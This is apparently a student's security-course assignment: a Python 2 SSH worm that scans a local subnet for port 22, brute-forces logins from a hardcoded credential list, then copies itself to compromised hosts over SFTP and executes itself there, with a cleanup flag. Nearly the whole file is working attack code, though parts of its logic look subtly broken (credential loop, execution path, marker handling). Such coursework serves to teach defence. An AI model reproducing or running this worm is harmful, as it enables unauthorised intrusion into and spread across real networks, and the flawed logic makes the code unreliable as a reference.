"""******************
Adam Villarosa
CPSC 456-01
Assignment 2 - Worm
******************"""
import paramiko
import sys
import socket
import nmap
import netinfo
import os

# The list of credentials to attempt
credList = [
('hello', 'world'),
('hello1', 'world'),
('root', '#Gig#'),
('cpsc', 'cpsc'),
]

# The file marking whether the worm should spread
INFECTED_MARKER_FILE = "/tmp/infected.txt"

##################################################################
# Returns whether the worm should spread
# @return - True if the infection succeeded and false otherwise
##################################################################
def isInfectedSystem():
	return os.path.exists(INFECTED_MARKER_FILE)

#################################################################
# Marks the system as infected
#################################################################
def markInfected():
	f = open(INFECTED_MARKER_FILE, "w+")
	f.write("You have been infected")
	f.close()

###############################################################
# Spread to the other system and execute
# @param sshClient - the instance of the SSH client connected
# to the victim system
###############################################################
def spreadAndExecute(sshClient):
	sftp = sshClient.open_sftp()
	sftp.put("worm.py", "/tmp/" + "worm.py")
	sshClient.exec_command("chmod a+x /tmp/worm.py")
	sshClient.exec_command("./tmp/worm.py")

############################################################
# Try to connect to the given host given the existing
# credentials
# @param host - the host system domain or IP
# @param userName - the user name
# @param password - the password
# @param sshClient - the SSH client
# return - 0 = success, 1 = probably wrong credentials, and
# 3 = probably the server is down or is not running SSH
###########################################################
def tryCredentials(host, userName, password, sshClient):

	try:
		sshClient.connect(host, username=userName, password=password)
	except socket.error:
		print "Server is down"
		return (sshClient, 3)
	except paramiko.SSHException:
		print "Username: ", userName
		print "Password ", password
		print "Credentials are not correct"
		return (sshClient, 1)
	else:
		print "Credentials are correct!"
		return (sshClient, 0)

###############################################################
# Wages a dictionary attack against the host
# @param host - the host to attack
# @return - the instace of the SSH paramiko class and the
# credentials that work in a tuple (ssh, username, password).
# If the attack failed, returns a NULL
###############################################################
def attackSystem(host):

	# The credential list
	global credList

	# Create an instance of the SSH client
	ssh = paramiko.SSHClient()

	# Set some parameters to make things easier.
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	# The results of an attempt
	attemptResults = None

	# Go through the credentials
	for (username, password) in credList:

		attemptResults = tryCredentials(host, username, password, ssh)

	return attemptResults

####################################################
# Returns the IP of the current system
# @param interface - the interface whose IP we would
# like to know
# @return - The IP address of the current system
####################################################
def getMyIP(interface):
	return netinfo.get_ip(interface)

#######################################################
# Returns the list of systems on the same network
# @return - a list of IP addresses on the same network
#######################################################
def getHostsOnTheSameNetwork():
	portScanner = nmap.PortScanner()

	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')

	hostInfo = portScanner.all_hosts()

	liveHosts = []

	for host in hostInfo:
		if portScanner[host].state() == "up":
			liveHosts.append(host)

	return liveHosts

#######################################################
# Clean by removing the marker and copied worm program
# @param sshClient - the instance of the SSH client
# connected to the victim system
#######################################################
def cleaner(sshClient):
	sshClient.open_sftp()
	sshClient.exec_command("rm /tmp/infected.txt /tmp/worm.py")
	print "Removed infected files."
	sshClient.close()

# If we are being run without a command line parameters,
# then we assume we are executing on a victim system and
# will act maliciously. This way, when you initially run the
# worm on the origin system, you can simply give it some command
# line parameters so the worm knows not to act maliciously
# on attackers system. If you do not like this approach,
# an alternative approach is to hardcode the origin system's
# IP address and have the worm check the IP of the current
# system against the hardcoded IP.

#Get the IP of the current system
selfIP = getMyIP("enp0s3")
print "Self IP: ", selfIP

#creating an Infected.txt
markInfected()

# Get the hosts on the same network
networkHosts = getHostsOnTheSameNetwork()

#Remove the IP of the current system from the list of discovered systems
networkHosts.remove(selfIP)

# Printing hosts without own IP
print "Found hosts: ", networkHosts

# Go through the network hosts
for host in networkHosts:

	# Try to attack this host
	sshInfo =  attackSystem(host)

	print sshInfo

	# Did the attack succeed?
	if sshInfo[1] == 0:
		# If the user enters "python worm.py -c", will execute cleaner
		if (len(sys.argv) == 2) and (sys.argv[1] == '-c'):
			cleaner(sshInfo[0])

		else:
			print "Trying to spread"
			try:
				sftp = sshInfo[0].open_sftp()
				print(sftp.stat(INFECTED_MARKER_FILE))
				print('file exists and now spreading worm')
				sftp.close()
				spreadAndExecute(sshInfo[0])
			except IOError:
				remotepath = INFECTED_MARKER_FILE
				localpath = INFECTED_MARKER_FILE
				print('copying file and infecting')
				sftp = sshInfo[0].open_sftp()
				sftp.put(localpath, remotepath)
				sftp.close()
				
			print "Spreading complete"
